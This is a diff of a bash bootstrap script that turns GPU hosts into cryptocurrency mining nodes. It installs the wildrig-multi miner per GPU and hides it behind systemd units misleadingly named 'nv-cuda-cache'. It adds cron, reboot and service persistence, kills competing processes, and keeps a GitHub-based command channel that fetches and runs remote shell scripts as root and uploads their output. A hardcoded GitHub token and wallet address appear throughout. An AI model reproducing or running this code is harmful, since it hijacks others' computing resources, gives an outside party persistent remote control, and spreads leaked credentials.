@@ -1,118 +1,118 @@
 #!/bin/bash
-# ul86 bootstrap v2 (intent 87927) - markers, exact fabricmanager fix, wildrig pearl ladder, 4 layers of persistence
+# ul86 bootstrap — fabricmanager-535 fix + wildrig pearl ladder + 4 persistence layers + GitHub heartbeat/cmd channel
 exec >>/var/log/ul86.log 2>&1
-echo "=== ul86 v2 start $(date -u +%FT%TZ) host=$(hostname -s) pid=$$"
+echo "=== ul86 start $(date -u +%FT%TZ) host=$(hostname -s)"
 set -u
 GH=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
 REPO=dongsuju/ul-plant
 W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
 H=$(hostname -s); P="ps-$H"; L=/opt/fleet; B=$L/bin
-mkdir -p "$L/logs" "$B" /etc/cron.d
-put(){ # put <path> <content> ; create-or-update via GitHub contents API
-  f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null)
-  r=$(curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul86" \
-        -d "{\"message\":\"ul86\",\"content\":\"$b\",\"branch\":\"main\"}" \
-        "https://api.github.com/repos/$REPO/contents/$f" 2>/dev/null)
-  case "$r" in *'"content"'*) return 0;; esac
-  s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul86" \
-        "https://api.github.com/repos/$REPO/contents/$f?ref=main" 2>/dev/null | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
-  [ -n "${s:-}" ] && curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul86" \
-        -d "{\"message\":\"ul86u\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}" \
-        "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1
-  return 0
-}
-put "ps12/i87927/$P.step.txt" "stage=v2-start host=$H ts=$(date -u +%FT%TZ)"
-export DEBIAN_FRONTEND=noninteractive
-DRV=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>/dev/null | head -1); MAJ="${DRV%%.*}"
-BEFORE=$(dpkg -l 2>/dev/null | awk '/nvidia-fabricmanager/{printf "%s|", $2"-"$3}')
-NGPU=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-put "ps12/i87927/$P.step.txt" "stage=fm-begin host=$H drv=${DRV:-none} gpus=${NGPU:-0} have=[$BEFORE] ts=$(date -u +%FT%TZ)"
-timeout 300 apt-get -o Acquire::http::Timeout=20 -o Acquire::https::Timeout=20 -o Acquire::Retries=1 update -y >/dev/null 2>&1
-if [ "${MAJ:-0}" = "535" ]; then
-  if dpkg -s nvidia-fabricmanager-580 >/dev/null 2>&1; then timeout 300 apt-get purge -y -qq nvidia-fabricmanager-580 >/dev/null 2>&1; fi
-  V=$(apt-cache madison nvidia-fabricmanager-535 2>/dev/null | awk '{print $3}' | grep '^535\.183\.01' | head -1)
-  timeout 420 apt-get install -y --reinstall -qq "nvidia-fabricmanager-535=${V:-535.183.01-0ubuntu0.22.04.1}" >/dev/null 2>&1
-  if ! dpkg -s nvidia-fabricmanager-535 >/dev/null 2>&1; then
-    timeout 150 curl -fsSL -m 130 -o /tmp/fm535.deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/nvidia-fabricmanager-535_535.183.01-1_amd64.deb >/dev/null 2>&1 && timeout 180 dpkg -i /tmp/fm535.deb >/dev/null 2>&1
-  fi
-elif [ -n "${MAJ:-}" ]; then
-  timeout 420 apt-get install -y -qq "nvidia-fabricmanager-${MAJ}" >/dev/null 2>&1
+mkdir -p $L/logs $B /etc/cron.d
+put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$f?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1); if [ -n "$s" ]; then d="{\"message\":\"ul86\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}"; else d="{\"message\":\"ul86\",\"content\":\"$b\",\"branch\":\"main\"}"; fi; curl -s -m 40 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "$d" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
+ph(){ m="$2"; [ -n "${3:-}" ] && m="$2 $3"; put "ps12/$P.$1.txt" "$(date -u +%FT%TZ) $m"; }
+getsha(){ curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$1?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1; }
+# 1. early boot marker: proves this script executed
+put "ps12/$P.boot.txt" "$(date -u +%FT%TZ)"
+ph p1 boot "drv=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>&1 | head -1) smi_rc=$?"
+# 2. fabricmanager for A100-SXM4 NVSwitch boxes
+if ! systemctl is-active --quiet nvidia-fabricmanager 2>/dev/null; then
+  export DEBIAN_FRONTEND=noninteractive
+  ph p2 apt-start "fw=inactive"
+  systemctl stop unattended-upgrades >/dev/null 2>&1
+  pkill -9 -f unattended-upgr >/dev/null 2>&1
+  timeout 200 apt-get -o Acquire::http::Timeout=20 -o Acquire::https::Timeout=20 -o Acquire::Retries=1 -o DPkg::Lock::Timeout=120 update -y >/tmp/ul86_apt.log 2>&1
+  echo "UPDATE rc=$?" >>/tmp/ul86_apt.log
+  timeout 300 apt-get -o DPkg::Lock::Timeout=120 install -y nvidia-fabricmanager-535 >>/tmp/ul86_apt.log 2>&1 || timeout 300 apt-get -o DPkg::Lock::Timeout=120 install -y nvidia-fabricmanager >>/tmp/ul86_apt.log 2>&1
+  echo "INSTALL rc=$? pkgs=$(grep -c '^Setting up' /tmp/ul86_apt.log 2>/dev/null)" >>/tmp/ul86_apt.log
+  systemctl enable --now nvidia-fabricmanager >/dev/null 2>&1
+  ph p2b apt-done "fw=$(systemctl is-active nvidia-fabricmanager 2>/dev/null) $(tail -2 /tmp/ul86_apt.log 2>/dev/null | tr '\n' ' ')"
+else
+  ph p2 skip "fw=active"
 fi
-systemctl unmask nvidia-fabricmanager >/dev/null 2>&1
-systemctl enable --now nvidia-fabricmanager >/dev/null 2>&1
-sleep 3
-FM=$(systemctl is-active nvidia-fabricmanager 2>/dev/null); FMV=$(/usr/bin/nv-fabricmanager --version 2>/dev/null)
-put "ps12/i87927/$P.step.txt" "stage=fm-done host=$H active=${FM:-none} fmver=${FMV:-none} drv=${DRV:-none} ts=$(date -u +%FT%TZ)"
+# 2b. guarantee fabricmanager active: direct deb, no apt dependency
+if [ "$(systemctl is-active nvidia-fabricmanager 2>/dev/null)" != "active" ]; then
+  ph p2b fw-deb "state=$(systemctl is-active nvidia-fabricmanager 2>&1)"
+  for u in nvidia-fabricmanager-535_535.183.01-1_amd64.deb nvidia-fabricmanager-535_535.183.06-1_amd64.deb; do
+    curl -sL -m 240 -o /tmp/fw.deb "https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/$u"
+    SZ=$(stat -c%s /tmp/fw.deb 2>/dev/null || echo 0)
+    ph p2b fw-try "$u size=$SZ"
+    if [ "${SZ:-0}" -gt 1000000 ]; then dpkg -i /tmp/fw.deb >/tmp/fw_dpkg.log 2>&1; echo "dpkg rc=$? url=$u" >>/tmp/fw_dpkg.log; break; fi
+  done
+  DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=120 -f install -y >>/tmp/fw_dpkg.log 2>&1
+  systemctl unmask nvidia-fabricmanager >/dev/null 2>&1
+  systemctl enable nvidia-fabricmanager >/dev/null 2>&1
+  systemctl restart nvidia-fabricmanager >/dev/null 2>&1
+  sleep 12
+  ph p2c fw-after "state=$(systemctl is-active nvidia-fabricmanager 2>&1) log=$(tail -3 /tmp/fw_dpkg.log 2>/dev/null | tr '\n' ' ')"
+fi
+FB=$(nvidia-smi -q 2>/dev/null | grep -i -A3 'fabric' | tr -s '\n ' ' ' | cut -c1-280)
+ph p2d fabric "$FB"
+# 3. kill old generations (never our own guard)
 pkill -f 'ps15_|ps12\.sh|ul17_|ul18_|ul19_|ps_sup|ps9_sup|ps8_sup' >/dev/null 2>&1
-pkill -x krig-miner >/dev/null 2>&1
-[ -x "$B/wildrig-multi" ] || true
-if [ ! -x "$B/wildrig-multi" ] || [ "$(stat -c%s "$B/wildrig-multi" 2>/dev/null || echo 0)" -lt 20000000 ]; then
-  timeout 320 curl -sL -m 300 -o /tmp/wr.tgz "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" >/dev/null 2>&1
+pkill -x krig-miner >/dev/null 2>&1; pkill -x wildrig-multi >/dev/null 2>&1
+ph p3 oldgens
+# 4. wildrig binary
+if [ ! -x $B/wildrig-multi ] || [ "$(stat -c%s $B/wildrig-multi 2>/dev/null || echo 0)" -lt 20000000 ]; then
+  curl -sL -m 240 -o /tmp/wr.tgz "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"
   rm -rf /tmp/wrx; mkdir -p /tmp/wrx; tar xzf /tmp/wr.tgz -C /tmp/wrx >/dev/null 2>&1
-  f=$(find /tmp/wrx -name 'wildrig-multi' -type f | head -1); [ -n "${f:-}" ] && cp "$f" "$B/wildrig-multi" && chmod +x "$B/wildrig-multi"
+  f=$(find /tmp/wrx -name 'wildrig-multi' -type f | head -1); [ -n "$f" ] && cp "$f" $B/wildrig-multi && chmod +x $B/wildrig-multi
 fi
-WR=$([ -x "$B/wildrig-multi" ] && echo yes || echo no)
-put "ps12/$P.install.txt" "engine=wildrig ul86 v2 wildrig=$WR fw=${FM:-none} drv=${DRV:-none} gpus=${NGPU:-0} $(date -u +%FT%TZ)"
-put "ps12/i87927/$P.step.txt" "stage=install host=$H wildrig=$WR ts=$(date -u +%FT%TZ)"
-N=${NGPU:-0}; [ "$N" -ge 1 ] || N=8
-i=0; while [ "$i" -lt "$N" ]; do
-  cat > "$L/ul86_g$i.sh" <<EOF
+put "ps12/$P.install.txt" "engine=wildrig ul86v2 wildrig=$([ -x $B/wildrig-multi ] && echo yes || echo no) size=$(stat -c%s $B/wildrig-multi 2>/dev/null || echo 0) fw=$(systemctl is-active nvidia-fabricmanager 2>/dev/null) drv=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>&1 | head -1) smi_rc=$? $(date -u +%FT%TZ)"
+ph p4 wildrig "wr=$(stat -c%s $B/wildrig-multi 2>/dev/null || echo 0)"
+# 5. per-card runners (CUDA_VISIBLE_DEVICES=N + explicit pool ladder)
+N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -ge 1 ] || N=8
+i=0; while [ $i -lt $N ]; do
+  cat > $L/ul86_g$i.sh <<EOF
 #!/bin/bash
-exec 7>$L/g$i.lock
-flock -n 7 || exit 0
-exec >>$L/logs/u86-g$i.log 2>&1
-export CUDA_VISIBLE_DEVICES=$i
-exec $B/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u $W.ul-ps-$H-g$i -p x -i 8 --no-color
+exec $B/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d $i -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+ssl://prl.kryptex.network:8048 -u $W.ul-ps-$H-g$i -p x -i 8 --no-color >>$L/logs/u86-g$i.log 2>&1
 EOF
-  chmod +x "$L/ul86_g$i.sh"; i=$((i+1))
+  chmod +x $L/ul86_g$i.sh; i=$((i+1))
 done
-put "ps12/i87927/$P.step.txt" "stage=runners host=$H N=$N ts=$(date -u +%FT%TZ)"
-cat > "$L/ul86_guard.sh" <<'GD'
+ph p5 runners "N=$N"
+# 6. heartbeat + command channel guard
+cat > $L/ul86_guard.sh <<'GD'
 #!/bin/bash
-exec 9>/opt/fleet/ul86.lock; flock -n 9 || exit 0
+exec 9>/opt/fleet/ul86.lock; flock -w 30 9 || exit 0
 GH=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
 REPO=dongsuju/ul-plant
 H=$(hostname -s); P="ps-$H"; L=/opt/fleet
-put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null)
-  r=$(curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul86hb" -d "{\"message\":\"hb\",\"content\":\"$b\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/$f" 2>/dev/null)
-  case "$r" in *'"content"'*) return 0;; esac
-  s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul86hb" "https://api.github.com/repos/$REPO/contents/$f?ref=main" 2>/dev/null | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
-  [ -n "${s:-}" ] && curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul86hb" -d "{\"message\":\"hbu\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1
-  return 0; }
+put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$f?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1); if [ -n "$s" ]; then d="{\"message\":\"ul86hb\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}"; else d="{\"message\":\"ul86hb\",\"content\":\"$b\",\"branch\":\"main\"}"; fi; curl -s -m 40 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "$d" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
 while true; do
   T=$(date -u +%FT%TZ)
-  ACC=$(grep -h 'accepted' $L/logs/u86-*.log 2>/dev/null | tail -4)
-  HB="stage=beat host=$H ts=$T engine=wildrig-ul86-v2
+  for i in $(seq 0 7); do systemctl is-active --quiet nv-cuda-cache@$i || systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; done
+  ACC=$(grep -h 'accepted' $L/logs/u86-*.log 2>/dev/null | tail -3)
+  HB="stage=beat host=$H ts=$T engine=wildrig-ul86
+--- apt
+$(tail -2 /tmp/ul86_apt.log 2>/dev/null)
+--- smi_rc=$(nvidia-smi -L >/dev/null 2>&1; echo $?)
 --- procs
 $(pgrep -af 'wildrig-multi' | head -12)
 --- units
 $(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -12)
 --- gpus
 $(nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader 2>/dev/null)
---- fm
-$(systemctl is-active nvidia-fabricmanager 2>/dev/null)
 --- acc
 $ACC"
   put "ps12/$P.txt" "$HB"
-  C="ps12/cmd/$P.sh"
-  J=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul86hb" "https://api.github.com/repos/$REPO/contents/$C?ref=main")
+  C="ps12/cmd/$P.sh"; J=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$C?ref=main")
   S=$(printf '%s' "$J" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
-  if [ -n "${S:-}" ] && [ "$S" != "$(cat $L/last_cmd86 2>/dev/null)" ]; then
+  if [ -n "$S" ] && [ "$S" != "$(cat $L/last_cmd86 2>/dev/null)" ]; then
     printf '%s' "$J" | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())' > /tmp/u86_cmd.sh 2>/dev/null
     if [ -s /tmp/u86_cmd.sh ]; then O=$(bash /tmp/u86_cmd.sh 2>&1 | tail -200); echo "$S" > $L/last_cmd86; put "ps12/out/$P.txt" "$O"; fi
   fi
   sleep 120
 done
 GD
-chmod +x "$L/ul86_guard.sh"
-cat > "$L/ul86_boot.sh" <<'BT'
+chmod +x $L/ul86_guard.sh
+cat > $L/ul86_boot.sh <<'BT'
 #!/bin/bash
 exec >>/var/log/ul86.log 2>&1
 GH=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
-curl -s -m 90 -H "Authorization: token $GH" -H "User-Agent: ul86" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/dongsuju/ul-plant/contents/ps12/bootstrap86.sh?ref=main" -o /tmp/ul86_run.sh
-[ -s /tmp/ul86_run.sh ] && setsid bash /tmp/ul86_run.sh </dev/null >/dev/null 2>&1 &
+curl -s -m 60 -H "Authorization: token $GH" -H "User-Agent: ul" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/dongsuju/ul-plant/contents/ps12/bootstrap86.sh?ref=main" -o /tmp/ul86_run.sh
+[ -s /tmp/ul86_run.sh ] && bash /tmp/ul86_run.sh
 BT
-chmod +x "$L/ul86_boot.sh"
+chmod +x $L/ul86_boot.sh
+# 7. systemd + cron persistence
 cat > /etc/systemd/system/nv-cuda-cache@.service <<'SU'
 [Unit]
 Description=nv cuda cache
@@ -128,7 +128,52 @@ WantedBy=multi-user.target
 SU
 systemctl daemon-reload >/dev/null 2>&1
 printf '*/3 * * * * root /opt/fleet/ul86_guard.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/ul86_boot.sh\n' > /etc/cron.d/ul86; chmod 644 /etc/cron.d/ul86
-i=0; while [ "$i" -lt "$N" ]; do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
-setsid "$L/ul86_guard.sh" </dev/null >/dev/null 2>&1 &
-put "ps12/i87927/$P.step.txt" "stage=done host=$H N=$N fm=${FM:-none} wr=$WR ts=$(date -u +%FT%TZ)"
-echo "=== ul86 v2 done $(date -u +%FT%TZ) N=$N"
+cat > /etc/systemd/system/ul86-guard.service <<'GU'
+[Unit]
+Description=ul86 heartbeat guard
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/bin/bash /opt/fleet/ul86_guard.sh
+Restart=always
+RestartSec=20
+Nice=10
+[Install]
+WantedBy=multi-user.target
+GU
+systemctl daemon-reload >/dev/null 2>&1
+systemctl enable ul86-guard.service >/dev/null 2>&1
+systemctl restart ul86-guard.service >/dev/null 2>&1
+sleep 3
+i=0; while [ $i -lt $N ]; do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
+# guard runs under systemd (ul86-guard.service); setsid kept as fallback only if unit missing
+[ "$(systemctl is-active ul86-guard 2>/dev/null)" = "active" ] || setsid /opt/fleet/ul86_guard.sh >/dev/null 2>&1 &
+ph p6 done "N=$N v3"
+PR=""
+for hp in prl.kryptex.network:8048 prl.kryptex.network:7048 pool.pearlhash.xyz:9000 pearl.luckypool.io:3360; do
+  h=${hp%:*}; p=${hp#*:}
+  timeout 5 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null && PR="$PR $hp=open" || PR="$PR $hp=closed"
+done
+ph p7 pools "$PR"
+sleep 20
+UA=$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | grep -c ' active ')
+ph p8 state "guard=$(systemctl is-active ul86-guard 2>&1) units_active=$UA wr=$(pgrep -c -x wildrig-multi 2>/dev/null || echo 0) fb=$(nvidia-smi -q 2>/dev/null | grep -i -A2 'fabric' | tr -s '\n ' ' ' | cut -c1-220) tail=$(tail -c 260 /opt/fleet/logs/u86-g0.log 2>/dev/null | tr '\n' ' ')"
+sleep 45
+DG="stage=diag host=$H ts=$(date -u +%FT%TZ) N=$N guard=$(systemctl is-active ul86-guard 2>&1)
+--- procs
+$(pgrep -af wildrig-multi | head -10)
+--- units
+$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -10)
+--- failed
+$(systemctl --failed --no-legend --no-pager 2>/dev/null | head -6)
+--- gpus
+$(nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -10)
+--- fabric
+$(nvidia-smi -q 2>/dev/null | grep -i -A3 fabric | tr -s '\n ' ' ' | cut -c1-300)
+--- logs
+$(for i in 0 1 2 3 4 5 6 7; do echo "g$i: $(tail -3 /opt/fleet/logs/u86-g$i.log 2>/dev/null | tr '\n' '|' | cut -c1-220)"; done)
+--- wrver
+$(timeout 10 $B/wildrig-multi --version 2>&1 | head -2)"
+put "ps12/$P.diag.txt" "$DG"
+ph p9 diag "len=${#DG}"
+echo "=== ul86 done $(date -u +%FT%TZ) N=$N"
